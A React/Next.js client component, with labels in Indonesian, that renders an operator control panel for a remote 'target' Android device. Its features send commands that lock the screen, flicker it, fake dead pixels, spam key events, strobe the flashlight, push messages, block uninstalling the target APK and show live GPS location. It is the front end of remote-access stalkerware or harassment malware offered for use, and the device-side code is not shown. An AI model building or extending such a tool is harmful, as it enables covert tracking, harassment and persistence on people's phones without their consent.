"use client";
import { useState } from "react";
import { motion } from "framer-motion";

type Device = {
  id: string;
  name: string;
  model: string;
  online: boolean;
  lastSeen: string;
  battery: number;
  ip: string;
};

export default function ControlPanel({
  device,
  onBack,
}: {
  device: Device;
  onBack: () => void;
}) {
  const [active, setActive] = useState<Record<string, boolean>>({});
  const [message, setMessage] = useState("");
  const [flashSpeed, setFlashSpeed] = useState(5);
  const [lineColor, setLineColor] = useState<"green" | "pink">("green");
  const [sending, setSending] = useState(false);
  const [lastResult, setLastResult] = useState("");

  async function sendCommand(type: string, payload: any = {}) {
    setSending(true);
    setLastResult("");
    try {
      const res = await fetch("/api/commands", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          deviceId: device.id,
          type,
          payload,
        }),
      });
      const data = await res.json();
      if (data.ok) {
        setLastResult(`Perintah "${type}" terkirim`);
        setActive((prev) => ({ ...prev, [type]: true }));
      } else {
        setLastResult("Gagal kirim perintah");
      }
    } catch {
      setLastResult("Error jaringan");
    } finally {
      setSending(false);
      setTimeout(() => setLastResult(""), 3000);
    }
  }

  const features = [
    { id: "lock", label: "Lock Device", desc: "Kunci layar device target" },
    { id: "line", label: "Lightsaber Line", desc: "Garis neon horizontal di layar", extra: true },
    { id: "deadpixel", label: "Dead Pixel", desc: "Warna layar berganti-ganti cepat" },
    { id: "flicker", label: "Flicker", desc: "Layar berkedip-kedip" },
    { id: "message", label: "Kirim Pesan", desc: "Pesan muncul di tengah layar (15 detik)", extra: true },
    { id: "spamkey", label: "Spam Keyboard", desc: "Spam input / key event" },
    { id: "flashlight", label: "Spam Senter", desc: "Flashlight berkedip (kecepatan bisa diatur)", extra: true },
    { id: "antiuninstall", label: "Anti Uninstall", desc: "Cegah uninstall APK target" },
    { id: "gps", label: "GPS Real-time", desc: "Lihat lokasi live device" },
  ];

  return (
    <div className="space-y-4 pb-4">
      <button onClick={onBack} className="text-sm text-nexa-neon font-bold flex items-center gap-1">
        ← Kembali
      </button>

      <div className="neobrutal p-4">
        <div className="flex items-center gap-3">
          <div className={`w-3 h-3 rounded-full ${device.online ? "bg-nexa-neon animate-pulse" : "bg-zinc-600"}`} />
          <div>
            <div className="font-bold">{device.name}</div>
            <div className="text-xs text-zinc-400">
              {device.model} · {device.ip}
            </div>
          </div>
        </div>
      </div>

      {lastResult && (
        <motion.div
          initial={{ opacity: 0, y: -8 }}
          animate={{ opacity: 1, y: 0 }}
          className="text-center text-sm font-bold text-nexa-neon bg-nexa-neon/10 py-2 rounded-xl border border-nexa-neon/30"
        >
          {lastResult}
        </motion.div>
      )}

      <div className="space-y-3">
        {features.map((f) => (
          <div key={f.id} className="neobrutal p-4 space-y-3">
            <div className="flex items-center justify-between">
              <div>
                <div className="font-bold">{f.label}</div>
                <div className="text-xs text-zinc-400">{f.desc}</div>
              </div>
              <button
                disabled={sending}
                onClick={() => {
                  if (f.id === "message") return;
                  if (f.id === "line") {
                    const next = !active.line;
                    sendCommand("line", { enabled: next, color: lineColor });
                    setActive((p) => ({ ...p, line: next }));
                    return;
                  }
                  if (f.id === "flashlight") {
                    const next = !active.flashlight;
                    sendCommand("flashlight", { enabled: next, speed: flashSpeed });
                    setActive((p) => ({ ...p, flashlight: next }));
                    return;
                  }
                  const next = !active[f.id];
                  sendCommand(f.id, { enabled: next });
                  setActive((p) => ({ ...p, [f.id]: next }));
                }}
                className={`px-4 py-2 rounded-xl border-2 border-black font-bold text-sm transition-all ${
                  active[f.id] ? "bg-nexa-neon text-black shadow-neo" : "bg-zinc-800 text-white"
                }`}
              >
                {active[f.id] ? "ON" : "OFF"}
              </button>
            </div>

            {f.id === "line" && (
              <div className="flex gap-2">
                <button
                  onClick={() => setLineColor("green")}
                  className={`flex-1 py-2 rounded-lg border-2 font-bold text-sm ${
                    lineColor === "green"
                      ? "border-nexa-neon bg-nexa-neon/20 text-nexa-neon"
                      : "border-zinc-700"
                  }`}
                >
                  Green
                </button>
                <button
                  onClick={() => setLineColor("pink")}
                  className={`flex-1 py-2 rounded-lg border-2 font-bold text-sm ${
                    lineColor === "pink"
                      ? "border-nexa-pink bg-nexa-pink/20 text-nexa-pink"
                      : "border-zinc-700"
                  }`}
                >
                  Pink
                </button>
              </div>
            )}

            {f.id === "message" && (
              <div className="space-y-2">
                <textarea
                  value={message}
                  onChange={(e) => setMessage(e.target.value)}
                  placeholder="Tulis pesan..."
                  className="w-full bg-black border-2 border-zinc-700 rounded-xl p-3 text-sm outline-none focus:border-nexa-neon resize-none"
                  rows={2}
                />
                <button
                  disabled={sending || !message.trim()}
                  onClick={() => {
                    sendCommand("message", { text: message, duration: 15 });
                    setMessage("");
                  }}
                  className="w-full py-2.5 rounded-xl bg-nexa-neon text-black font-bold border-2 border-black shadow-neo disabled:opacity-50"
                >
                  Kirim Pesan
                </button>
              </div>
            )}

            {f.id === "flashlight" && active[f.id] && (
              <div>
                <div className="flex justify-between text-xs mb-1">
                  <span>Kecepatan</span>
                  <span>{flashSpeed}x</span>
                </div>
                <input
                  type="range"
                  min={1}
                  max={15}
                  value={flashSpeed}
                  onChange={(e) => setFlashSpeed(Number(e.target.value))}
                  className="w-full accent-nexa-cyan"
                />
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  );
}
